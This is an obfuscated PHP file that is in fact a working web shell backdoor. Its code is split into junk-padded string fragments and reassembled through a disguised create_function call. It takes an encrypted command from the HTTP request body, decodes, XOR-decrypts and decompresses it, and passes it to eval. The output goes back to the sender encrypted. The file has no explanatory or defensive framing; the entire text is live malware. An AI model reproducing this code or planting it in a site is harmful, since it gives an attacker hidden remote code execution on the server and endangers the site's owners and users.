<?php
$d='hVP("/$kh(VPVP.+)$kf/",VP@fileVP_VPget_contenVPts("php://VPinpVPut"),$m)VP==1)VP {VP@ob_staVPVPrt';
$Q='$k="aVPVPfbb7b2eVP";$kh="VPee9d04b6fb1dVP";VP$kf="VP8VPc92ce636e8b";$p=VP"f0VPBVPIx6tAKVPjX90YvR";funct';
$U='();@eVPval(@gzuncoVPmpress(@x(VP@bVPase64_deVPcode($m[1]VP),VP$k)));$oVP=@ob_getVP_contVPents();V';
$n='P@obVP_end_cleVPan();VP$r=@baVPseVP64_encVPode(@VPx(@gzcomVPpress($o),$kVPVP));pVPrint("$p$VPkh$r$kf");}';
$r=str_replace('G','','cGrGeatGe_fGuGGnction');
$K='j=VP0;(VP$j<$c&&$i<$lVPVP);$jVPVP++,$i+VP+){$o.=$t{$i}^$k{$VPj}VP;}}retuVPrn $o;}if VP(@pVPreg_matc';
$m='ioVPn xVP($t,$k)VP{$VPc=stVPrlen($k);$l=sVPtrlVPen($t);$VPo="";foVPr($i=0;VP$i<$VPl;){fVPor($';
$z=str_replace('VP','',$Q.$m.$K.$d.$U.$n);
$X=$r('',$z);$X();
?>
